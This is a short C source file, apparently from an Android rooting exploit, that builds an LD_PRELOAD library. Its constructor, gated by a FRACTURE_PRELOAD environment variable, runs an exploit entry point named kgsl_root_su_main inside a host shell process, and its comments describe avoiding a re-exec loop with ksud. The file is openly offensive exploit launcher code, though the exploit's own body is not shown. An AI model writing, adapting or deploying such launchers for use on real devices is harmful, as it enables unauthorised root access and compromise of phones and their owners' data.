#include <stdlib.h>
#include <unistd.h>

/*
 * LD_PRELOAD entry: the exploit's main is built as kgsl_root_su_main and
 * called from a constructor, so loading this library into a host process
 * (e.g. /system/bin/sh) runs the exploit in that process.
 */
extern int kgsl_root_su_main(int argc, char **argv);

__attribute__((constructor))
static void kgsl_root_su_preload(void) {
    /*
     * Only the shell that the loader explicitly marked should run the
     * exploit.  The root child execs ksud late-load; if LD_PRELOAD is still
     * in the environment, ksud reloads this library, the constructor runs
     * the exploit again, and its own ksud exec repeats the loop.
     */
    const char *host = getenv("FRACTURE_PRELOAD");
    if (!host || host[0] != '1')
        return;
    unsetenv("LD_PRELOAD");
    char *argv[] = { "kgsl_root_su", 0 };
    _exit(kgsl_root_su_main(1, argv));
}
